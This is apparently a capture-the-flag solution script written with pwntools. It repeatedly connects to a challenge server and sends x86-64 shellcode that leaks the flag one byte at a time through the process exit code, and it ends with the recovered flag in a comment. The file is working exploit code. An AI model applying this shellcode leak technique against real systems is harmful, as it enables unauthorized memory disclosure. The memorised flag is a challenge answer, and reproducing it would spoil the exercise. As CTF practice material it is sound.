from pwn import *

context.arch = "amd64"

flag = b''
for i in range(100):
    p = remote("gold.b01le.rs", 4005)
    # p = remote("localhost", 4900)

    shellcode = f'''
        mov rax, fs:[0x300]
        mov rax, [rax]
        sub rax, 0x1620
        add rax, 0x4080
        add rax, {i}
        mov dil, [rax]
        mov rax, {constants.SYS_exit}
        syscall
    '''

    payload = ''.join('{:02x}'.format(x) for x in list(asm(shellcode))).encode()
    p.sendlineafter(b'input:', payload)

    p.recvuntil(b'return value: ')
    flag += p8(int(p.recvline()[:-1]))
    log.info(f"{flag}")

    p.close()

# bctf{x86_64_r3g1sTer_bL0at_sAVe5_7he_d4y:D_%#$*}
